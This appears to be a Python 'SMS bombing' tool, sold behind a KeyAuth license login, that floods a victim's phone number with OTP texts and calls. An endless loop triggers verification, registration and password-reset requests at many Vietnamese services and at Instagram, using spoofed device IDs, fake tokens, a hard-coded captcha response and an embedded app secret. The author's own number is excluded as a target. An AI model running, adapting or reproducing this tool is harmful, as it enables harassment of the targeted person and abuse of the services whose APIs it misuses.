import json
import urllib.request
import urllib
import uuid
import requests
import hmac
import hashlib, random ,time
from datetime import datetime
import bs4,base64
from time import sleep
import requests
import os, sys, requests, random, json
import time
from random import choice, randint, shuffle
from asciimatics.effects import BannerText, Print, Scroll
from asciimatics.renderers import ColourImageFile, FigletText, ImageFile, StaticRenderer
from asciimatics.scene import Scene
from asciimatics.screen import Screen
from asciimatics.exceptions import ResizeScreenError, StopApplication
ip = requests.get('https://api.ipify.org').text.strip()
loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].lower()
ua = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',}
imei = uuid.uuid4()
def random_string(length):
            number = '0123456789'
            alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNPQRSTUVWXYZ'
            id = ''
            for i in range(0,length,2):
                id += random.choice(number)
                id += random.choice(alpha)
            return id
def atkspm(screen):
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, "methods.gif", screen.height,
                              uni=screen.unicode_aware),
              screen.height//- 5,
              speed=1),
    ]
    scenes.append(Scene(effects, 18))

    screen.play(scenes, stop_on_resize=False, repeat=False)

def autoketik(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.001)
try:
  from pystyle import Center, Anime, Colors, Colorate
except:
  os.system('pip install pystyle')
  
def cang02(phone):
    microtime = int(round(time.time() * 1000))
    imei = getimei()
    secureid = get_SECUREID()
    token= get_TOKEN()
    rkey = generateRandomString(22, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
    aaid = getimei()
    data = {
        "user": phone,
        "msgType": "SEND_OTP_MSG",
        "cmdId": f"{microtime}000000",
        "lang": "vi",
        "time": microtime,
        "channel": "APP",
        "appVer": 31062,
        "appCode": "3.1.6",
        "deviceOS": "ANDROID",
        "buildNumber": 0,
        "appId": "vn.momo.platform",
        "result": True,
        "errorCode": 0,
        "errorDesc": "",
        "momoMsg": {
            "_class": "mservice.backend.entity.msg.RegDeviceMsg",
            "number": phone,
            "imei": imei,
            "cname": "Vietnam",
            "ccode": "084",
            "device": "CPH1605",
            "firmware": "23",
            "hardware": "mt6755",
            "manufacture": "OPPO",
            "csp": "",
            "icc": "",
            "mcc": "452",
            "device_os": "Android",
            "secure_id": secureid
        },
        "extra": {
            "action": "SEND",
            "rkey": rkey,
            "AAID": aaid,
            "IDFA": "",
            "TOKEN": token,
            "SIMULATOR": "",
            "SECUREID": secureid,
            "MODELID": "oppo cph1605mt6755b6z9qwrwhuy9yhrk",
            "isVoice": True,
            "REQUIRE_HASH_STRING_OTP": True,
            "checkSum": ""
        }
    }
    data1 = {
        "user": phone,
        "msgType": "CHECK_USER_BE_MSG",
        "cmdId": f"{microtime}000000",
        "lang": "vi",
        "time": microtime,
        "channel": "APP",
        "appVer": 31062,
        "appCode": "3.1.6",
        "deviceOS": "ANDROID",
        "buildNumber": 0,
        "appId": "vn.momo.platform",
        "result": True,
        "errorCode": 0,
        "errorDesc": "",
        "momoMsg": {
            "_class": "mservice.backend.entity.msg.RegDeviceMsg",
            "number": phone,
            "imei": imei,
            "cname": "Vietnam",
            "ccode": "084",
            "device": "CPH1605",
            "firmware": "23",
            "hardware": "mt6755",
            "manufacture": "OPPO",
            "csp": "",
            "icc": "",
            "mcc": "452",
            "device_os": "Android",
            "secure_id": secureid
        },
        "extra": {
            "checkSum": ""
        }
    }
    h = {
        "agent_id" : "undefined",
        "sessionkey" : "",
        "user_phone" : "undefined",
        "authorization" : "Bearer undefined",
        "msgtype" : "SEND_OTP_MSG",
        "Host" : "api.momo.vn",
        "User-Agent" : "okhttp/3.14.17",
        "app_version": "31062",
        "app_code" : "3.1.6",
        "device_os" : "ANDROID",
        "Content-Type" : "application/json"
    }
    requests.post("https://api.momo.vn/backend/auth-app/public/CHECK_USER_BE_MSG",headers=h,json=data1).text
    requests.post("https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG",headers=h,json=data).text
    try:
        t = requests.post("https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG",headers=h,json=data).json()
    except:
        t = requests.post("https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG",headers=h,json=data).text
def generateRandomString(length, minh):
    return ''.join(random.choices(minh, k=length))
def get_SECUREID():
    return ''.join(random.choices('0123456789abcdef', k=17))
def getimei():
    return generateRandomString(8, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(12, '0123456789abcdef')
def get_TOKEN():
    return generateRandomString(22, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+':'+generateRandomString(9, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(20, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(12, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(7, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(7, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(53, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(9, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'_'+generateRandomString(11, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(4, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')


def zlpay(phone):
	headers = {'Host': 'api.zalopay.vn','x-user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/7.13.1 OS/14.6 Platform/ios Secured/false  ZaloPayWebClient/7.13.1','x-device-model': 'iPhone8,2','x-density': 'iphone3x','authorization': 'Bearer ','x-device-os': 'IOS','x-drsite': 'off','accept': '*/*','x-app-version': '7.13.1','accept-language': 'vi-VN;q=1.0, en-VN;q=0.9','user-agent': 'ZaloPay/7.13.1 (vn.com.vng.zalopay; build:503903; iOS 14.6.0) Alamofire/5.2.2','x-platform': 'NATIVE','x-os-version': '14.6',}
	params = {'phone_number': phone,}
	token = requests.get('https://api.zalopay.vn/v2/account/phone/status', params=params, headers=headers).json()
	json_data = {'phone_number': phone,'send_otp_token': token,}
	response = requests.post('https://api.zalopay.vn/v2/account/otp', headers=headers, json=json_data).text


def gbay(phone):
	json_data = {'phone_number': '0'+phone,'hash': random_string(40),}
	requests.post('https://api-wallet.g-pay.vn/internal/api/v3/users/send-otp-reg-phone', json=json_data).json()


def tiki(phone):
	json_data = {'phone_number': phone,}
	response_tiki = requests.post('https://tiki.vn/api/v2/customers/otp_codes', headers=ua, json=json_data).text


def moca(phone):
	headers = {'Host': 'moca.vn','Accept': '*/*','Device-Token': str(imei),'X-Requested-With': 'XMLHttpRequest','Accept-Language': 'vi','X-Moca-Api-Version': '2','platform': 'P_IOS-2.10.42','User-Agent': 'Pass/2.10.42 (iPhone; iOS 13.3; Scale/2.00)',}
	params = {'phoneNumber': phone,}
	home = requests.get('https://moca.vn/moca/v2/users/role', params=params, headers=headers).json()
	token = home['data']['registrationId']
	response = requests.post(f'https://moca.vn/moca/v2/users/registrations/{token}/verification', headers=headers).json()

def banner():
	autoketik ( f"""
 \x1b[38;2;0;191;255m ╔═╗╦═╗╔═╗╔═╗╔╗╔╦  ╦╔╗╔  ═╗ ╦  ╔╦╗╔═╗╔═╗╔═╗
 \x1b[38;2;0;191;255m ╠═╣╠╦╝║ ╦║ ║║║║╚╗╔╝║║║  ╔╩╦╝   ║ ║╣ ╚═╗╚═╗
 \x1b[38;2;0;191;255m ╩ ╩╩╚═╚═╝╚═╝╝╚╝ ╚╝ ╝╚╝  ╩ ╚═   ╩ ╚═╝╚═╝╚═╝

\x1b[38;2;250;128;114m=================================================
\x1b[38;2;255;255;255mCode By : \x1b[38;2;127;255;212mBui Xuan An(Tess)
\x1b[38;2;255;255;255mZalo    : \x1b[38;2;127;255;212m0387413823
\x1b[38;2;255;255;255mDiscord : \x1b[38;2;127;255;212mNTrungTess#3223
\x1b[38;2;255;255;255m=================================================
\x1b[38;2;255;255;255mYou IP  : \x1b[38;2;255;0;0m{ip}
\x1b[38;2;255;255;255mLocation : \x1b[38;2;255;0;0m{loc}
""")
from keyauth import api

import sys
import time
import platform
import os
import hashlib
from time import sleep
from datetime import datetime

# import json as jsond
# ^^ only for auto login/json writing/reading

# watch setup video if you need help https://www.youtube.com/watch?v=L2eAQOmuUiA

if sys.version_info.minor < 10:  # Python version check (Bypass Patch)
    print("[Security] - Python 3.10 or higher is recommended. The bypass will not work on 3.10+")
    print("You are using Python {}.{}".format(sys.version_info.major, sys.version_info.minor))

if platform.system() == 'Windows':
    os.system('cls & title Login')  # clear console, change title
elif platform.system() == 'Linux':
    os.system('clear')  # clear console
    sys.stdout.write("\x1b]0;Login\x07")  # change title
elif platform.system() == 'Darwin':
    os.system("clear && printf '\e[3J'")  # clear console
    os.system('''echo - n - e "\033]0;Login\007"''')  # change title

print("Initializing")


def getchecksum():
    md5_hash = hashlib.md5()
    file = open(''.join(sys.argv), "rb")
    md5_hash.update(file.read())
    digest = md5_hash.hexdigest()
    return digest


keyauthapp = api(
    name = "LegitVN", #App name (Manage Applications --> Application name)
    ownerid = "lwLFeOdCpf", #Owner ID (Account-Settings --> OwnerID)
    secret = "4b85d437a4ccd6587b0001ccacaca1b379e5a6aea19f28f215b999951f5bb777", #App secret(Manage Applications --> App credentials code)
    version = "1.0",
    hash_to_check = getchecksum()
)

print(f"""
App data:
 \x1b[38;2;0;191;255m ╦  ╔═╗╔═╗╦╔╗╔
 \x1b[38;2;0;191;255m ║  ║ ║║ ╦║║║║
 \x1b[38;2;0;191;255m ╩═╝╚═╝╚═╝╩╝╚╝
Number of users: {keyauthapp.app_data.numUsers}
Number of online users: {keyauthapp.app_data.onlineUsers}
Number of keys: {keyauthapp.app_data.numKeys}
Application Version: {keyauthapp.app_data.app_ver}
Customer panel link: {keyauthapp.app_data.customer_panel}
""")
print(f"Current Session Validation Status: {keyauthapp.check()}")
print(f"Blacklisted? : {keyauthapp.checkblacklist()}")  # check if blacklisted, you can edit this and make it exit the program if blacklisted


def answer():
    try:
        print("""
1.Login
2.Register
3.Upgrade
4.License Key Only
        """)
        ans = input("Select Option: ")
        if ans == "1":
            user = input('Provide username: ')
            password = input('Provide password: ')
            keyauthapp.login(user, password)
        elif ans == "2":
            user = input('Provide username: ')
            password = input('Provide password: ')
            license = input('Provide License: ')
            keyauthapp.register(user, password, license)
        elif ans == "3":
            user = input('Provide username: ')
            license = input('Provide License: ')
            keyauthapp.upgrade(user, license)
        elif ans == "4":
            key = input('Enter your license: ')
            keyauthapp.license(key)
        else:
            print("\nNot Valid Option")
            time.sleep(1)
            os.system('cls')
            answer()
    except KeyboardInterrupt:
        os._exit(1)


answer()

# region Extra Functions

# * Download Files form the server to your computer using the download function in the api class
# bytes = keyauthapp.file("FILEID")
# f = open("example.exe", "wb")
# f.write(bytes)
# f.close()


# * Set up user variable
# keyauthapp.setvar("varName", "varValue")

# * Get user variable and print it
# data = keyauthapp.getvar("varName")
# print(data)

# * Get normal variable and print it
# data = keyauthapp.var("varName")
# print(data)

# * Log message to the server and then to your webhook what is set on app settings
# keyauthapp.log("Message")

# * Get if the user pc have been blacklisted
# print(f"Blacklisted? : {keyauthapp.checkblacklist()}")

# * See if the current session is validated
# print(f"Session Validated?: {keyauthapp.check()}")


# * example to send normal request with no POST data
# data = keyauthapp.webhook("WebhookID", "?type=resetuser&user=username")

# * example to send form data
# data = keyauthapp.webhook("WebhookID", "", "type=init&name=test&ownerid=j9Gj0FTemM", "application/x-www-form-urlencoded")

# * example to send JSON
# data = keyauthapp.webhook("WebhookID", "", "{\"content\": \"webhook message here\",\"embeds\": null}", "application/json")

# * Get chat messages
# messages = keyauthapp.chatGet("CHANNEL")

# Messages = ""
# for i in range(len(messages)):
# Messages += datetime.utcfromtimestamp(int(messages[i]["timestamp"])).strftime('%Y-%m-%d %H:%M:%S') + " - " + messages[i]["author"] + ": " + messages[i]["message"] + "\n"

# print("\n\n" + Messages)

# * Send chat message
# keyauthapp.chatSend("MESSAGE", "CHANNEL")

# * Add Application Information to Title
# os.system(f"cls & title KeyAuth Python Example - Total Users: {keyauthapp.app_data.numUsers} - Online Users: {keyauthapp.app_data.onlineUsers} - Total Keys: {keyauthapp.app_data.numKeys}")

# * Auto-Login Example (THIS IS JUST AN EXAMPLE --> YOU WILL HAVE TO EDIT THE CODE PROBABLY)
# 1. Checking and Reading JSON

#### Note: Remove the ''' on line 151 and 226

'''try:
    if os.path.isfile('auth.json'): #Checking if the auth file exist
        if jsond.load(open("auth.json"))["authusername"] == "": #Checks if the authusername is empty or not
            print("""
1. Login
2. Register
            """)
            ans=input("Select Option: ")  #Skipping auto-login bc auth file is empty
            if ans=="1": 
                user = input('Provide username: ')
                password = input('Provide password: ')
                keyauthapp.login(user,password)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            elif ans=="2":
                user = input('Provide username: ')
                password = input('Provide password: ')
                license = input('Provide License: ')
                keyauthapp.register(user,password,license) 
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            else:
                print("\nNot Valid Option") 
                os._exit(1) 
        else:
            try: #2. Auto login
                with open('auth.json', 'r') as f:
                    authfile = jsond.load(f)
                    authuser = authfile.get('authusername')
                    authpass = authfile.get('authpassword')
                    keyauthapp.login(authuser,authpass)
            except Exception as e: #Error stuff
                print(e)
    else: #Creating auth file bc its missing
        try:
            f = open("auth.json", "a") #Writing content
            f.write("""{
    "authusername": "",
    "authpassword": ""
}""")
            f.close()
            print ("""
1. Login
2. Register
            """)#Again skipping auto-login bc the file is empty/missing
            ans=input("Select Option: ") 
            if ans=="1": 
                user = input('Provide username: ')
                password = input('Provide password: ')
                keyauthapp.login(user,password)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            elif ans=="2":
                user = input('Provide username: ')
                password = input('Provide password: ')
                license = input('Provide License: ')
                keyauthapp.register(user,password,license)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            else:
                print("\nNot Valid Option") 
                os._exit(1) 
        except Exception as e: #Error stuff
            print(e)
            os._exit(1) 
except Exception as e: #Error stuff
    print(e)
    os._exit(1)'''

# endregion


print("\nUser data: ")
print("Username: " + keyauthapp.user_data.username)
print("IP address: " + keyauthapp.user_data.ip)
print("Hardware-Id: " + keyauthapp.user_data.hwid)
# print("Subcription: " + keyauthapp.user_data.subscription) ## Print Subscription "ONE" name

subs = keyauthapp.user_data.subscriptions  # Get all Subscription names, expiry, and timeleft
for i in range(len(subs)):
    sub = subs[i]["subscription"]  # Subscription from every Sub
    timeleft = subs[i]["timeleft"]  # Timeleft from every Sub


onlineUsers = keyauthapp.fetchOnline()
OU = ""  # KEEP THIS EMPTY FOR NOW, THIS WILL BE USED TO CREATE ONLINE USER STRING.
if onlineUsers is None:
    OU = "No online users"
else:
    for i in range(len(onlineUsers)):
        OU += onlineUsers[i]["credential"] + " "

print("\n" + OU + "\n")

print("Created at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.createdate)).strftime('%Y-%m-%d %H:%M:%S'))
print("Last login at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.lastlogin)).strftime('%Y-%m-%d %H:%M:%S'))
print(f"Current Session Validation Status: {keyauthapp.check()}")
sleep(2)
os.system("cls" if os.name == "nt" else "clear")
if platform.system() == 'Windows':
    os.system('cls & title Main Spam')  # clear console, change title
elif platform.system() == 'Linux':
    os.system('clear')  # clear console
    sys.stdout.write("\x1b]0;Main Spam\x07")  # change title
elif platform.system() == 'Darwin':
    os.system("clear && printf '\e[3J'")  # clear console
    os.system('''echo - n - e "\033]0;Main Spam\007"''')  # change title
banner()
phone = input("\x1b[38;2;255;234;0mEnter Phone Number : \x1b[38;2;255;255;255m")
if phone == "0387413823" or phone == "387413823":
    exit("Vi Phạm!")
dl = int(input("\x1b[38;2;255;234;0mTime Delay > 0 : \x1b[38;2;255;255;255m"))
print("\x1b[38;2;255;255;255m=================================================")
Screen.wrapper(atkspm)
while(True):
	requests.get(f"https://howtospamsms.herokuapp.com/meta-vn?phone={phone[1:11]}")
	print(f'\033[1;37m[\033[1;33m¤\033[1;37m] Send Sms From \033[1;32mMeta \033[1;37mTo Number\033[1;31m {phone} \033[1;35m| \033[1;37mStatus : \033[1;32mSuccess')
	requests.get(f"https://howtospamsms.herokuapp.com/vieon?phone={phone}")
	print(f'\033[1;37m[\033[1;33m¤\033[1;37m] Send Sms From \033[1;32mVieon \033[1;37mTo Number\033[1;31m {phone} \033[1;35m| \033[1;37mStatus : \033[1;32mSuccess')
	cang02(phone)
	print(f'\033[1;37m[\033[1;33m¤\033[1;37m] Send Call From \033[1;32mMomo \033[1;37mTo Number\033[1;31m {phone} \033[1;35m| \033[1;37mStatus : \033[1;32mSuccess')
	requests.post("https://api.vayvnd.vn/v1/users/password-reset", headers={"Host": "api.vayvnd.vn","content-length": "22","accept": "application/json","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://vayvnd.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vayvnd.vn/","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"login":phone})).text
	print(f'\033[1;37m[\033[1;33m¤\033[1;37m] Send Call From \033[1;32mVay Nợ \033[1;37mTo Number\033[1;31m {phone} \033[1;35m| \033[1;37mStatus : \033[1;32mSuccess')
	tiki(phone)
	print(f'\033[1;37m[\033[1;33m¤\033[1;37m] Send Sms From \033[1;32mTiki \033[1;37mTo Number\033[1;31m {phone} \033[1;35m| \033[1;37mStatus : \033[1;32mSuccess')
	requests.post("https://products.popsww.com/api/v5/auths/register", headers={"Host": "products.popsww.com","content-length": "89","profileid": "62e58a27c6f857005396318f","sec-ch-ua-mobile": "?1","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6InI1aTZqN3dUTERBS3hMV3lZcDdaM2ZnUUJKNWk3U2tmRkJHR2tNNUlCSlYycFdiRDNwbVd1MUM2eTQyVHJRaUIiLCJ1c2VySWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOGUiLCJyb2xlcyI6WyJHVUVTVCJdLCJwcm9maWxlcyI6W3siaWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOGYiLCJhZ2UiOjEzLCJtcGFhIjp7ImlkIjoiNWQyM2UxMjU5NTI1MWI5OGJkMDQzMzc2IiwiYWdlIjoxM319LHsiaWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOTAiLCJhZ2UiOjcsIm1wYWEiOnsiaWQiOiI1ZDIzZTFlMjk1MjUxYjk4YmQwNDM0MWQiLCJhZ2UiOjd9fV0sImlhdCI6MTY1OTIxMDI3OSwiZXhwIjoxOTc0NTcwMjc5fQ.3exZEvv0YG1Uw0UYx2Mt9Oj3NhRb8BX-l4tIAcVv9gw","x-env": "production","content-type": "application/json","lang": "vi","sub-api-version": "1.1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","api-key": "5d2300c2c69d24a09cf5b09b","platform": "wap","sec-ch-ua-platform": "\"Linux\"","accept": "*/*","origin": "https://pops.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://pops.vn/auth/signin-signup/signup?isOffSelectProfile\u003dtrue","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"fullName":"","account":phone,"password":"Abcxaxgh","confirmPassword":"Abcxaxgh"})).text
	print(f'\033[1;37m[\033[1;33m¤\033[1;37m] Send Sms From \033[1;32mPOPS \033[1;37mTo Number\033[1;31m {phone} \033[1;35m| \033[1;37mStatus : \033[1;32mSuccess')
	requests.post("https://api.senmo.vn/api/user/send-one-time-password", headers={"Host": "api.senmo.vn","content-length": "23","sec-ch-ua": "\"Chromium\";v\u003d\"104\", \" Not A;Brand\";v\u003d\"99\", \"Google Chrome\";v\u003d\"104\"","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://senmo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://senmo.vn/user/login","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"phone":"84"+phone[1:11]})).text
	print(f'\033[1;37m[\033[1;33m¤\033[1;37m] Send Call From \033[1;32mVay Nợ \033[1;37mTo Number\033[1;31m {phone} \033[1;35m| \033[1;37mStatus : \033[1;32mSuccess')
	requests.post("https://api.alfrescos.com.vn/api/v1/User/SendSms?culture\u003dvi-VN", headers={"Host": "api.alfrescos.com.vn","content-length": "124","accept-language": "vi-VN","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","content-type": "application/json","accept": "application/json, text/plain, */*","brandcode": "ALFRESCOS","devicecode": "web","sec-ch-ua-platform": "\"Android\"","origin": "https://alfrescos.com.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://alfrescos.com.vn/","accept-encoding": "gzip, deflate, br"}, json=({"phoneNumber":phone,"secureHash":"add789229e0794d8508f948dacd710ae","deviceId":"","sendTime":1660806807513,"type":2})).text
	print(f'\033[1;37m[\033[1;33m¤\033[1;37m] Send Sms From \033[1;32mALFRESCOS \033[1;37mTo Number\033[1;31m {phone} \033[1;35m| \033[1;37mStatus : \033[1;32mSuccess')
	requests.post("https://latte.lozi.vn/v1.2/auth/register/phone/initial", headers={"Host": "latte.lozi.vn","content-length": "101","x-city-id": "50","accept-language": "vi_VN","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","content-type": "application/json","x-lozi-client": "1","x-access-token": "unknown","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://loship.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://loship.vn/","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"device":"Android 8.1.0","platform":"Chrome/104.0.0.0","countryCode":"84","phoneNumber":phone[1:11]})).text
	print(f'\033[1;37m[\033[1;33m¤\033[1;37m] Send Sms From \033[1;32mLozi \033[1;37mTo Number\033[1;31m {phone} \033[1;35m| \033[1;37mStatus : \033[1;32mSuccess')
	requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone}).text
	print(f'\033[1;37m[\033[1;33m¤\033[1;37m] Send Sms From \033[1;32mFPT \033[1;37mTo Number\033[1;31m {phone} \033[1;35m| \033[1;37mStatus : \033[1;32mSuccess')
	requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json
	print(f'\033[1;37m[\033[1;33m¤\033[1;37m] Send Sms From \033[1;32mFacebook \033[1;37mTo Number\033[1;31m {phone} \033[1;35m| \033[1;37mStatus : \033[1;32mSuccess')
	requests.post("https://apigateway.f88.vn/services/appvay/api/onlinelending/VerifyOTP/sendOTP", headers={"Host": "apigateway.f88.vn","content-length": "595","content-encoding": "gzip","traceparent": "00-c7d4ad181d561015110814044adf720e-d3fed9b4added2cf-01","sec-ch-ua-mobile": "?1","authorization": "Bearer null","content-type": "application/json","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","accept": "*/*","origin": "https://online.f88.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://online.f88.vn/","accept-encoding": "gzip, deflate, br"}, json={"phoneNumber":phone,"recaptchaResponse":"03ANYolqvEe93MY94VJjkvDUIsq6ysACNy1tsnG1xnFq9YLY1gyez-_QvS0YEsxe9D0ddnuXKmlrbWqvT3KTQD2Bhx9yLeQ6M-nzUChGrqS08GEhHIdCpl3JLvHctZYeX18O8qZqcHY-e7qHq1WG7kkPbykyx9KwxMDnzW3j1N0KymuMti1Z0WAUgXHDh-ifJvI3n4lp5Tzsq5k1Nswugf0X3HFexHAm9GACImJIDG46QRucLBRm0df6jfazibClJyKlLXdvnqmrjCt6Wy22C_h-RY9Iilj5Lcy9rawUShIMJoCFX08UOWP_llCE4T5h5kuUk1llSgu9pdHMK2T6OuEROwXt2begTITv-9l534brGibKVlwwbxLtfHWohLRYQC-tjYWWq7avFLPOA9d53_72KLKoYAuKjvqKul683bQ7HtEzZ-eK3VCiBQj1Za1EV3R69e648tCkNkGXr9kpr1n0ccGeNbXSuB3GHQQGPnDIGuYgalvKa77_iX68OQ90PouP2GeT_RvBY3","source":"Online"}).text
	print(f'\033[1;37m[\033[1;33m¤\033[1;37m] Send Sms From \033[1;32mF88 \033[1;37mTo Number\033[1;31m {phone} \033[1;35m| \033[1;37mStatus : \033[1;32mSuccess')
	zlpay(phone)
	print(f'\033[1;37m[\033[1;33m¤\033[1;37m] Send Sms From \033[1;32mZaloPay \033[1;37mTo Number\033[1;31m {phone} \033[1;35m| \033[1;37mStatus : \033[1;32mSuccess')
	gbay(phone)
	print(f'\033[1;37m[\033[1;33m¤\033[1;37m] Send Sms From \033[1;32mGbay \033[1;37mTo Number\033[1;31m {phone} \033[1;35m| \033[1;37mStatus : \033[1;32mSuccess')
	moca(phone)
	print(f'\033[1;37m[\033[1;33m¤\033[1;37m] Send Sms From \033[1;32mMoca \033[1;37mTo Number\033[1;31m {phone} \033[1;35m| \033[1;37mStatus : \033[1;32mSuccess')
	requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts", headers={"Host": "api.tamo.vn","content-length": "39","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://www.tamo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.tamo.vn/","accept-encoding": "gzip, deflate, br"}, json=({"mobilePhone":{"number":phone}})).text
	print(f'\033[1;37m[\033[1;33m¤\033[1;37m] Send Call From \033[1;32mVay Nợ \033[1;37mTo Number\033[1;31m {phone} \033[1;35m| \033[1;37mStatus : \033[1;32mSuccess')
	for i in range(dl, 0, -1):
		print("\rPlease Wait To "+str(i)+" Seconds....", end="")
		time.sleep(1)
		print("\r                              ", end="\r")
	
